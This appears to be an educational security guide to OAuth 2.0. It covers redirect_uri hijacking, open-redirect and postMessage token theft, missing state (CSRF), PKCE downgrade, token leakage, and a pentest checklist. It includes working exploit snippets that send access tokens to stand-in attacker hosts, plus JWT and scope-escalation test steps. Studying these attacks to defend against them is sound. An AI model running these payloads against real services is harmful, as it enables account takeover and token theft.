OAuth 2.0 Attacks

How delegated authorization works, why every handoff is a trust assumption, and how to break each one.

6 attack patterns · RFC 6749 / 7636 / 9700
```

The Technology

What OAuth 2.0 actually is — and isn't

OAuth 2.0 is an authorization framework defined in RFC 6749. It lets a user grant a third-party app limited access to their resources on another service — without sharing their password. It's the mechanism behind "Sign in with Google," enterprise SSO, and every "Connect your account" button.

OAuth ≠ authentication. OAuth handles authorization (who can access what). OpenID Connect (OIDC) is the authentication layer built on top. When you see id_token, openid scope, or /userinfo, that's OIDC extending OAuth — not OAuth itself.

Instead of sharing passwords, OAuth introduces tokens — short-lived, scoped credentials that represent specific permissions. The user authenticates with the authorization server directly; the client app never sees their password.

The Four Roles

Resource Owner

The user. Owns the data and grants access. The person clicking "Approve" on the consent screen.

Client

The app requesting access. Confidential = backend server (can keep secrets). Public = SPA/mobile (cannot keep secrets).

Authorization Server

Authenticates the user, gets consent, issues tokens. Validates redirect_uri, client_id, scope. The gatekeeper.

Resource Server

The API holding protected data. Validates the access token on every request before serving resources.

Key Parameters

client_id — identifies the registered app. redirect_uri — where the auth server sends the code/token after consent. response_type — what the client wants back (code or token). scope — what permissions are being requested. state — CSRF protection token. code_challenge / code_verifier — PKCE parameters for public clients.

The Core Handoff

User ──(1) "Login with Social"──▸ Client App ``` │ ▼ Client ──(2) redirect──▸ Authorization Server │ /auth?client_id=X&redirect_uri=callback │ &response_type=code&scope=openid profile │ &state=random123 ▼ User authenticates + consents on auth server │ ▼ Auth Server ──(3) 302 redirect──▸ /callback?code=ABC&state=random123 │ ▼ Client ──(4) POST /token──▸ Auth Server [back-channel] │ sends: code + client_id + client_secret ▼ Auth Server returns: access_token (+ refresh_token) │ ▼ Client ──(5) API call──▸ Resource Server │ Authorization: Bearer access_token ▼ Protected resource ✓
```

Every arrow is a trust assumption. Every trust assumption is an attack surface. The security of OAuth depends entirely on the implementation — the spec gives flexibility, and that flexibility is where vulnerabilities live.

PKCE — Proof Key for Code Exchange

Public clients can't store a client_secret. Without PKCE, anyone who intercepts the authorization code can exchange it for a token. PKCE adds a challenge-response that binds the code to the client that requested it:

Client generates: ``` code_verifier = crypto_random (43-128 chars) code_challenge = BASE64URL(SHA256(code_verifier)) Auth request includes: /auth?…&code_challenge=XYZ&code_challenge_method=S256 Token exchange includes: POST /token → code=ABC & code_verifier=original_secret Server verifies: SHA256(code_verifier) === stored code_challenge ✓ match → issue token ✗ mismatch → reject
```

Even if an attacker steals the code, they don't have the code_verifier, so the exchange fails. OAuth 2.1 makes PKCE mandatory for all clients — confidential and public.

Implicit Flow — Why It's Dangerous

Risk surface

The token goes directly into the URL fragment. Fragments are visible in browser history, leakable via Referer headers when the page loads external resources, extractable via XSS on the callback page, and — critically — they survive HTTP 302 redirects. This means an open redirect anywhere on the client domain can carry the token off-site. There's no back-channel exchange, no server-side validation, and no refresh tokens. OAuth 2.1 formally removes this flow.

The Vulnerabilities

Six attack patterns — each exploits a missing or weak trust check in the OAuth handoff chain.

1 — redirect_uri Hijack

No validation → direct code/token theft
Normal flow

The redirect_uri tells the auth server where to send the code after consent. The server validates it against a pre-registered whitelist before redirecting. Only exact matches should pass.

Restaurant analogy

You hand the valet your keys with a note: "return my car to Hotel A's front door." The valet should check their approved list. If they deliver to whatever address the note says — the thief just writes their own address.

Attack

The auth server doesn't validate redirect_uri. Attacker swaps it to their own domain. Victim clicks the link — their authorization code gets delivered to the attacker. Attacker replays the code on the real callback.

Victim clicks malicious link ``` ▼ Auth Server: redirect_uri=https://attacker.com │ no validation ✗ ▼ 302 → https://attacker.com/?code=STOLEN │ Attacker replays: GET /callback?code=STOLEN ▼ Logged in as victim ✓
```

Real-world note: A 2023 ACM study tested 20 path-confusion payloads against major identity providers and found multiple accepted path traversal and encoding bypasses. A 2026 Keycloak CVE (CVE-2026-3872) was a ..;/ traversal bypass in the OIDC auth endpoint. This attack surface is alive and active.

Weakness

Prevention

exact string match only normalize paths before compare require redirect_uri on /token exchange never sanitize — validate then reject

2 — Token Theft via Open Redirect

Chaining prefix bypass + open redirect to leak fragment tokens
Normal flow (implicit grant)

With response_type=token, the access token lands in the URL fragment (#access_token=...). Fragments never leave the browser in HTTP requests — only client-side JS can read them. The callback page extracts and uses the token.

Key insight: URL fragments survive HTTP 302 redirects in most browsers. If you redirect the user after the token lands in the fragment, the fragment follows to the new destination.

Restaurant analogy

The valet is stricter: "I only deliver to Hotel A." But Hotel A has a shuttle that'll take you anywhere. The valet drops the car at Hotel A (valid address). The shuttle immediately drives it to the attacker.

Attack — two flaws chained

Flaw 1: The auth server does prefix-match on redirect_uri — accepts anything starting with the registered callback path, including traversal (/callback/../post/next). Flaw 2: The client has an open redirect (/post/next?path=...). The attacker's two-stage script: first visit triggers OAuth, second visit (with fragment) converts it to a query parameter for exfiltration.

Exploit page (no hash) → script redirects to: ``` /auth?redirect_uri=target/callback/../post/next?path=attacker │ prefix validates ✓ ▼ target/post/next?path=attacker#access_token=TOKEN │ open redirect fires, fragment preserved ▼ attacker/exploit#access_token=TOKEN │ script reads hash → redirects to ▼ attacker/?access_token=TOKEN ← access log ✓
``` 
<script>
```

if (!document.location.hash) {
window.location = ‘https://auth-server/auth?client_id=ID’
+ ‘&redirect_uri=https://target/callback/../post/next’
+ ‘%3fpath%3dhttps://attacker/exploit’
+ ‘&response_type=token&scope=openid profile email’
} else {
window.location = ‘/?’ + document.location.hash.substr(1)
}
```

Encoding gotcha: The ? and = inside redirect_uri must be URL-encoded (%3f, %3d) so the auth server doesn't parse them as separate OAuth params.

Weakness

prefix-match redirect_uri no path normalization open redirect on client domain implicit flow (fragments)

Prevention

exact-match redirect_uri kill open redirects use auth code + PKCE normalize before compare

3 — Token Theft via Proxy Page

Abusing postMessage with wildcard target origin
Normal flow

Some apps use window.postMessage to pass OAuth data between windows — an iframe handles the callback and sends the token to its parent. The second argument to postMessage specifies which origin can receive the message. This is sometimes called the "web message response mode."

// Dangerous — any parent receives this
```

window.parent.postMessage(data, ‘*’);

// Safe — locked to the expected origin
window.parent.postMessage(data, ‘https://trusted-app.com’);
```
Restaurant analogy

The delivery driver is told: "shout the package contents when you arrive at Hotel A." They shout to whoever is listening. Attacker parks a van in the lot with a microphone.

Attack

The redirect_uri is locked down. No open redirect. But a page on the client (e.g., a comment form) calls postMessage(data, '*'). Attacker embeds the OAuth flow in an iframe. The iframe's parent is the attacker's page — so postMessage delivers the token to attacker JS.

┌──────────────────────────────────────┐ ``` │ Attacker exploit page │ │ ┌────────────────────────────────┐ │ │ │ iframe: OAuth → proxy page │ │ │ │ → postMessage(data, ‘*’) │ │ │ └──────────┬─────────────────────┘ │ │ │ message event │ │ ▼ │ │ window.addEventListener(‘message’) │ │ fetch(’/?t=’ + JSON.stringify(e.data))│ └──────────────────────────────────────┘
``` 
<iframe src="https://auth-server/auth?client_id=ID
```

&redirect_uri=https://target/callback/../proxy-page
&response_type=token&scope=openid profile email”>
```

Gotcha: e.data may be an object, not a string. encodeURIComponent(e.data) gives [object Object]. Always wrap with JSON.stringify().

Weakness

postMessage with '*' no event.origin check embeddable in attacker iframe

Prevention

specify exact target origin validate event.origin on receiver CSP frame-ancestors X-Frame-Options

4 — Missing State = OAuth CSRF

Forcing account linking without user consent
Normal flow

The state parameter is OAuth's CSRF token. The client generates a crypto-random value, stores it in the session, sends it in the auth request, and verifies it matches on the callback. This ensures the callback corresponds to a request the user initiated — not an attacker's forged link.

Attack — login CSRF

If state is missing or not validated, the attacker starts an OAuth flow with their own account, captures the callback URL with the code, then tricks the victim into loading it. The victim's session gets linked to the attacker's OAuth identity. The attacker now logs in with their OAuth creds and gets the victim's account.

Attacker starts OAuth → approves with THEIR account ``` │ intercepts: /callback?code=ATTACKER_CODE ▼ Sends URL to victim (img tag, iframe, link) │ ▼ Victim’s browser: GET /callback?code=ATTACKER_CODE │ no state check ✗ ▼ Client links attacker’s OAuth identity → victim’s session ▼ Attacker logs in with their OAuth creds → victim’s account ✓
```

Weakness

missing state parameter static / predictable state state not bound to session

Prevention

crypto random state per request bind state to user session strict match on callback

5 — PKCE Downgrade / Bypass

When the server treats PKCE as optional
Normal flow

PKCE binds the authorization code to the client that requested it via a code_challenge / code_verifier pair. The auth server stores the challenge, and the token endpoint verifies SHA256(verifier) == challenge before issuing tokens.

Attack — PKCE downgrade

The server supports PKCE but doesn't enforce it. Attacker strips code_challenge and code_challenge_method from the auth request. Server issues a code anyway. Attacker exchanges the stolen code at /token without any code_verifier — token returned.

Burp Repeater test: ``` 1. Capture: GET /auth?…&code_challenge=XYZ&code_challenge_method=S256 1. Strip both PKCE params → send 1. Server returns code? → PKCE optional (vuln ✗) 1. POST /token with code, NO code_verifier 1. Token returned? → full bypass confirmed ✗ Also test: - code_challenge_method=plain (challenge = verifier) - Replay code_verifier from a different session
```

Weakness

PKCE optional not enforced plain method accepted no verifier check on /token

Prevention

require PKCE for all clients enforce S256 only reject /token without valid verifier
```

6 — Token Leakage via Referer & Storage

Tokens escaping through side channels
```
Leakage vectors

Tokens and codes can escape through channels developers overlook — even when the primary OAuth flow is correctly implemented.

Referer header. The callback page loads external resources (analytics, fonts, CDN scripts). The browser sends the current URL — including ?code=ABC in the query string — in the Referer header to every external domain.

Browser history. Implicit flow tokens in fragments and auth codes in query strings are recorded in history. Shared devices, browser sync, and shoulder surfing become attack vectors.

Server logs. Query-string params are logged by web servers, reverse proxies, CDNs, and WAFs by default. Auth codes sitting in access logs are visible to anyone with log access.

Insecure storage. Tokens in localStorage are accessible to any JS on the page — one XSS and the token is exfiltrated. Tokens in non-HttpOnly cookies are similarly exposed. Backend session storage with HttpOnly + Secure + SameSite cookies is the recommended pattern.

Weakness

tokens in URL query/fragment external resources on callback localStorage token storage missing Referrer-Policy

Prevention

Referrer-Policy: no-referrer no external resources on callback HttpOnly Secure SameSite cookies short-lived single-use codes response_mode=form_post
```

Hunt Checklist

Systematic testing order for engagements
```
01
Map the flow. Capture full login in Burp. Identify: flow type (code / token / hybrid), all params, endpoints (/auth, /token, /userinfo), confidential vs public client, PKCE presence.
02
Attack redirect_uri. Repeater. Escalate: domain swap → subdomain → path traversal → query injection → encoding → double encoding → param pollution → @ character. If strict domain, hunt for open redirects on the client to chain.
03
Hunt open redirects. Spider the client. Params: url, next, path, return, redirect, goto, dest, continue. Test each with an external domain. Low-sev alone — critical when chained with OAuth.
04
Grep for postMessage. Search all JS for postMessage( with '*'. Check addEventListener('message' handlers for missing event.origin validation. Test iframe embeddability of token-handling pages.
05
Check state. Remove state. Reuse old state. Modify it. If callback doesn't reject, the flow is CSRF-vulnerable. Test login CSRF: can you link attacker's OAuth account to victim's session?
06
Test PKCE. Strip code_challenge + code_challenge_method. Server still issues code? Exchange without code_verifier. Try method=plain. PKCE must be enforced, not optional.
07
Scope escalation. Add scopes: scope=openid admin. Does auth server accept? Does resource server independently validate scope per API call, or trust the token blindly?
08
Token leakage. External resources on callback page? Check Referer header. Check Referrer-Policy. Where are tokens stored — localStorage, cookies, session? Are codes single-use + short-lived?
09
JWT validation. For id_token: try alg:none, key confusion (RS256→HS256), expired tokens, wrong aud, wrong iss. Is the signature actually verified? Can you replay old tokens?
10
Client secrets in public clients. Grep APK decompilation and minified JS for client_secret. Mobile apps with custom URI schemes (myapp://) are vulnerable to scheme hijacking — malicious apps register the same scheme.
